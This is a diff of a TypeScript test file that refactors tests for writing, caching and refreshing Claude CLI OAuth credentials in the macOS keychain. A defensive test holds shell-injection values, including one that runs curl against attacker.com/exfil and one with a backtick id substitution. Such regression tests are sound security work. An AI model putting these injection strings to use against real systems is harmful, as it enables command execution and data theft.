@@ -53,6 +53,18 @@ function createJwtWithExp(expSeconds: number): string {
   return `${encode({ alg: "RS256", typ: "JWT" })}.${encode({ exp: expSeconds })}.signature`;
 }
 
+function mockClaudeCliCredentialRead() {
+  execSyncMock.mockImplementation(() =>
+    JSON.stringify({
+      claudeAiOauth: {
+        accessToken: `token-${Date.now()}`,
+        refreshToken: "cached-refresh",
+        expiresAt: Date.now() + 60_000,
+      },
+    }),
+  );
+}
+
 describe("cli credentials", () => {
   beforeAll(async () => {
     ({
@@ -98,28 +110,27 @@ describe("cli credentials", () => {
     expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
   });
 
-  it("prevents shell injection via untrusted token payload values", async () => {
-    const cases = [
-      {
-        access: "x'$(curl attacker.com/exfil)'y",
-        refresh: "safe-refresh",
-        expectedPayload: "x'$(curl attacker.com/exfil)'y",
-      },
-      {
-        access: "safe-access",
-        refresh: "token`id`value",
-        expectedPayload: "token`id`value",
-      },
-    ] as const;
-
-    for (const testCase of cases) {
+  it.each([
+    {
+      access: "x'$(curl attacker.com/exfil)'y",
+      refresh: "safe-refresh",
+      expectedPayload: "x'$(curl attacker.com/exfil)'y",
+    },
+    {
+      access: "safe-access",
+      refresh: "token`id`value",
+      expectedPayload: "token`id`value",
+    },
+  ] as const)(
+    "prevents shell injection via untrusted token payload value $expectedPayload",
+    async ({ access, refresh, expectedPayload }) => {
       execFileSyncMock.mockClear();
       mockExistingClaudeKeychainItem();
 
       const ok = writeClaudeCliKeychainCredentials(
         {
-          access: testCase.access,
-          refresh: testCase.refresh,
+          access,
+          refresh,
           expires: Date.now() + 60_000,
         },
         { execFileSync: execFileSyncMock },
@@ -132,10 +143,10 @@ describe("cli credentials", () => {
       const args = (addCall?.[1] as string[] | undefined) ?? [];
       const wIndex = args.indexOf("-w");
       const passwordValue = args[wIndex + 1];
-      expect(passwordValue).toContain(testCase.expectedPayload);
+      expect(passwordValue).toContain(expectedPayload);
       expect(addCall?.[0]).toBe("security");
-    }
-  });
+    },
+  );
 
   it("falls back to the file store when the keychain update fails", async () => {
     const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
@@ -189,50 +200,43 @@ describe("cli credentials", () => {
     expect(updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
   });
 
-  it("caches Claude Code CLI credentials within the TTL window", async () => {
-    execSyncMock.mockImplementation(() =>
-      JSON.stringify({
-        claudeAiOauth: {
-          accessToken: "cached-access",
-          refreshToken: "cached-refresh",
-          expiresAt: Date.now() + 60_000,
-        },
-      }),
-    );
+  it.each([
+    {
+      name: "caches Claude Code CLI credentials within the TTL window",
+      allowKeychainPromptSecondRead: false,
+      advanceMs: 0,
+      expectedCalls: 1,
+      expectSameObject: true,
+    },
+    {
+      name: "refreshes Claude Code CLI credentials after the TTL window",
+      allowKeychainPromptSecondRead: true,
+      advanceMs: CLI_CREDENTIALS_CACHE_TTL_MS + 1,
+      expectedCalls: 2,
+      expectSameObject: false,
+    },
+  ] as const)(
+    "$name",
+    async ({ allowKeychainPromptSecondRead, advanceMs, expectedCalls, expectSameObject }) => {
+      mockClaudeCliCredentialRead();
+      vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
 
-    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
+      const first = await readCachedClaudeCliCredentials(true);
+      if (advanceMs > 0) {
+        vi.advanceTimersByTime(advanceMs);
+      }
+      const second = await readCachedClaudeCliCredentials(allowKeychainPromptSecondRead);
 
-    const first = await readCachedClaudeCliCredentials(true);
-    const second = await readCachedClaudeCliCredentials(false);
-
-    expect(first).toBeTruthy();
-    expect(second).toEqual(first);
-    expect(execSyncMock).toHaveBeenCalledTimes(1);
-  });
-
-  it("refreshes Claude Code CLI credentials after the TTL window", async () => {
-    execSyncMock.mockImplementation(() =>
-      JSON.stringify({
-        claudeAiOauth: {
-          accessToken: `token-${Date.now()}`,
-          refreshToken: "refresh",
-          expiresAt: Date.now() + 60_000,
-        },
-      }),
-    );
-
-    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
-
-    const first = await readCachedClaudeCliCredentials(true);
-
-    vi.advanceTimersByTime(CLI_CREDENTIALS_CACHE_TTL_MS + 1);
-
-    const second = await readCachedClaudeCliCredentials(true);
-
-    expect(first).toBeTruthy();
-    expect(second).toBeTruthy();
-    expect(execSyncMock).toHaveBeenCalledTimes(2);
-  });
+      expect(first).toBeTruthy();
+      expect(second).toBeTruthy();
+      if (expectSameObject) {
+        expect(second).toEqual(first);
+      } else {
+        expect(second).not.toEqual(first);
+      }
+      expect(execSyncMock).toHaveBeenCalledTimes(expectedCalls);
+    },
+  );
 
   it("reads Codex credentials from keychain when available", async () => {
     const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
